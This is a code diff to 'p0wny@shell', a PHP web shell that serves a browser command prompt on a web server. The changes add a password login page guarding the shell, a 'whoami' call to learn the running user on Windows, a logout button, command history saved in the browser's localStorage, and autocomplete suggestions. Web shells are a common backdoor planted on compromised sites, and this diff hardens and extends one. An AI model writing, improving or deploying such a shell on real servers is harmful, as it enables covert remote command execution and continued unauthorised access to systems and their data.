@@ -1,5 +1,116 @@
 <?php
 
+session_start();
+
+// Generate password's hash with
+// php -r "echo password_hash('yourstrongpassword', PASSWORD_DEFAULT );"
+// Comment to remove password protection
+// $PASSWD = '$2y$10$xTVjPTvVllWTgjf3YBlK7OmJiP9YG/aml5bCJdbFiS41LKAqyquBa'; 
+
+function isAuthenticated() {
+    return isset($_SESSION['authenticated']) && $_SESSION['authenticated'] === true;
+}
+
+// Handle authentication
+if (isset($_POST['password'])) {
+    if (password_verify($_POST['password'], $PASSWD)) {
+        $_SESSION['authenticated'] = true;
+        header('Location: ' . $_SERVER['PHP_SELF']);
+        exit;
+    } else {
+        $login_error = "You don't have any superpowers....";
+    }
+}
+
+// Handle logout
+if (isset($_GET['logout'])) {
+    session_destroy();
+    header('Location: ' . $_SERVER['PHP_SELF']);
+    exit;
+}
+
+// Handle login form display
+if (isset($PASSWD) && strlen($PASSWD) !== 0 && !isAuthenticated()) {
+?>
+
+<!DOCTYPE html>
+<html>
+<head>
+    <meta charset="UTF-8" />
+    <title>p0wny@shell:~#</title>
+    <meta name="viewport" content="width=device-width, initial-scale=1.0" />
+    <style>
+        body {
+            margin: 0;
+            padding: 0;
+            background: #333;
+            color: #eee;
+            font-family: monospace;
+            display: flex;
+            justify-content: center;
+            align-items: center;
+            height: 100vh;
+        }
+        .login-box {
+            background: #222;
+            padding: 40px;
+            border-radius: 5px;
+            box-shadow: 0 0 10px rgba(0, 0, 0, .5);
+            text-align: center;
+        }
+        .login-box h2 {
+            color: #1BC9E7;
+            margin-top: 0;
+        }
+        .login-box input[type="password"] {
+            width: 250px;
+            padding: 10px;
+            margin: 20px 0;
+            background: #333;
+            border: 1px solid #555;
+            color: #eee;
+            font-family: monospace;
+            font-size: 14px;
+        }
+        .login-box input[type="submit"] {
+            padding: 10px 30px;
+            background: #75DF0B;
+            border: none;
+            color: #222;
+            font-family: monospace;
+            font-size: 14px;
+            cursor: pointer;
+            font-weight: bold;
+        }
+        .login-box input[type="submit"]:hover {
+            background: #5bc000;
+        }
+        .error {
+            color: #ff4444;
+            margin: 10px 0;
+        }
+    </style>
+</head>
+<body>
+    <div class="login-box">
+        <h2>Authentication required</h2>
+        <?php if (isset($login_error)): ?>
+            <div class="error"><?php echo $login_error; ?></div>
+        <?php endif; ?>
+        <form method="POST">
+            <input type="password" name="password" placeholder="Password" required autofocus />
+            <br>
+            <input type="submit" value="Login" />
+        </form>
+    </div>
+</body>
+</html>
+
+<?php
+    exit;
+}
+
+// Beyond this point, user is authenticated or no password protection is set
 $SHELL_CONFIG = array(
     'username' => 'p0wny',
     'hostname' => 'shell',
@@ -139,10 +250,15 @@ function initShellConfig() {
     global $SHELL_CONFIG;
 
     if (isRunningWindows()) {
-        $username = getenv('USERNAME');
-        if ($username !== false) {
+        $username = executeCommand("whoami");
+        if (isset($username) && strlen($username) > 0){
             $SHELL_CONFIG['username'] = $username;
-        }
+        } else {
+            $username = getenv('USERNAME');
+            if ($username !== false) {
+                $SHELL_CONFIG['username'] = $username;
+            }
+        } 
     } else {
         $pwuid = posix_getpwuid(posix_geteuid());
         if ($pwuid !== false) {
@@ -250,6 +366,24 @@ if (isset($_GET["feature"])) {
                 text-align: center;
             }
 
+            #logout-btn {
+                position: absolute;
+                top: 10px;
+                right: 10px;
+                padding: 5px 15px;
+                background: #1BC9E7;;
+                color: #eee;
+                border: none;
+                cursor: pointer;
+                font-family: monospace;
+                font-size: 10pt;
+                border-radius: 3px;
+            }
+
+            #logout-btn:hover {
+                background: #17b2ceff;
+            }
+
             :root {
                 --shell-margin: 25px;
             }
@@ -326,20 +460,33 @@ if (isset($_GET["feature"])) {
             #shell-input div {
                 flex-grow: 1;
                 align-items: stretch;
+                position: relative;
             }
 
             #shell-input input {
                 outline: none;
+            }
+
+            #shell-suggestion {
+                position: absolute;
+                pointer-events: None;
+                font-family: monospace;
+                font-size: 10pt;
+                line-height: 30px;
+                white-space: pre;
+                left:1px;
             }
         </style>
 
         <script>
             var SHELL_CONFIG = <?php echo json_encode($SHELL_CONFIG); ?>;
             var CWD = null;
+            var HISTORY_MAX_SIZE = 500;
             var commandHistory = [];
             var historyPosition = 0;
             var eShellCmdInput = null;
             var eShellContent = null;
+            var suggestedCommand = "";
 
             function _insertCommand(command) {
                 eShellContent.innerHTML += "\n\n";
@@ -412,7 +559,6 @@ if (isset($_GET["feature"])) {
                     },
                     _requestCallback
                 );
-
             }
 
             function featureDownload(name, file) {
@@ -475,7 +621,6 @@ if (isset($_GET["feature"])) {
                     CWD = atob(response.cwd);
                     _updatePrompt();
                 });
-
             }
 
             function escapeHtml(string) {
@@ -496,12 +641,14 @@ if (isset($_GET["feature"])) {
                         featureShell(eShellCmdInput.value);
                         insertToHistory(eShellCmdInput.value);
                         eShellCmdInput.value = "";
+                        clearSuggestion();
                         break;
                     case "ArrowUp":
                         if (historyPosition > 0) {
                             historyPosition--;
                             eShellCmdInput.blur();
                             eShellCmdInput.value = commandHistory[historyPosition];
+                            clearSuggestion();
                             _defer(function() {
                                 eShellCmdInput.focus();
                             });
@@ -519,17 +666,88 @@ if (isset($_GET["feature"])) {
                             eShellCmdInput.focus();
                             eShellCmdInput.value = commandHistory[historyPosition];
                         }
+                        clearSuggestion();
+                        break;
+                    case "ArrowRight":
+                        if (eShellCmdInput.selectionStart === eShellCmdInput.value.length && suggestedCommand) {
+                            event.preventDefault();
+                            eShellCmdInput.value = suggestedCommand;
+                            clearSuggestion();
+                        }
                         break;
                     case 'Tab':
                         event.preventDefault();
-                        featureHint();
+                        if (suggestedCommand) {
+                            eShellCmdInput.value = suggestedCommand;
+                            clearSuggestion();
+                        } else {
+                            featureHint();
+                        }
                         break;
+                    default:
+                        _defer(updateSuggestion);
                 }
             }
 
             function insertToHistory(cmd) {
+                if (commandHistory.length >= HISTORY_MAX_SIZE) {
+                    commandHistory.shift();
+                }
                 commandHistory.push(cmd);
                 historyPosition = commandHistory.length;
+                saveHistoryToLocalStorage();
+            }
+
+            function saveHistoryToLocalStorage() {
+                try {
+                    localStorage.setItem('shellCommandHistory', JSON.stringify(commandHistory));
+                } catch (e) {
+                    console.error('Failed to save history:', e);
+                }
+            }
+
+            function loadHistoryFromLocalStorage() {
+                try {
+                    var saved = localStorage.getItem('shellCommandHistory');
+                    if (saved) {
+                        commandHistory = JSON.parse(saved);
+                        historyPosition = commandHistory.length;
+                    }
+                } catch (e) {
+                    console.error('Failed to load history:', e);
+                    commandHistory = [];
+                }
+            }
+
+            function updateSuggestion() {
+                var currentValue = eShellCmdInput.value;
+                if (!currentValue.trim()) {
+                    clearSuggestion();
+                    return;
+                }
+                for (var i = commandHistory.length - 1; i >= 0; i--) {
+                    if (commandHistory[i].startsWith(currentValue) && commandHistory[i] !== currentValue) {
+                        suggestedCommand = commandHistory[i];
+                        displaySuggestion(currentValue, commandHistory[i]);
+                        return;
+                    }
+                }
+                clearSuggestion();
+            }
+
+            function displaySuggestion(typed, suggestion) {
+                var suggestionSpan = document.getElementById("shell-suggestion");
+                var remaining = suggestion.substring(typed.length);
+                suggestionSpan.innerHTML = '<span style="opacity: 0;">' + escapeHtml(typed) + '</span><span style="color: rgba(238, 238, 238, 0.3);">' + escapeHtml(remaining) + '</span>';
+                suggestionSpan.style.left = eShellCmdInput.offsetLeft + "2px";
+            }
+
+            function clearSuggestion() {
+                suggestedCommand = "";
+                var suggestionSpan = document.getElementById("shell-suggestion");
+                if (suggestionSpan) {
+                    suggestionSpan.textContent = "";
+                }
             }
 
             function makeRequest(url, params, callback) {
@@ -575,6 +793,7 @@ if (isset($_GET["feature"])) {
             window.onload = function() {
                 eShellCmdInput = document.getElementById("shell-cmd");
                 eShellContent = document.getElementById("shell-content");
+                loadHistoryFromLocalStorage();
                 updateCwd();
                 eShellCmdInput.focus();
             };
@@ -582,6 +801,13 @@ if (isset($_GET["feature"])) {
     </head>
 
     <body>
+<?php
+if (isset($PASSWD) && strlen($PASSWD)) {
+?>
+    <button id="logout-btn" onclick="window.location.href='?logout'">Logout</button>
+<?php
+}
+?>
         <div id="shell">
             <pre id="shell-content">
                 <div id="shell-logo">
@@ -597,6 +823,7 @@ if (isset($_GET["feature"])) {
                 <label for="shell-cmd" id="shell-prompt" class="shell-prompt">???</label>
                 <div>
                     <input id="shell-cmd" name="cmd" onkeydown="_onShellCmdKeyDown(event)"/>
+                    <span id="shell-suggestion"></span>
                 </div>
             </div>
         </div>
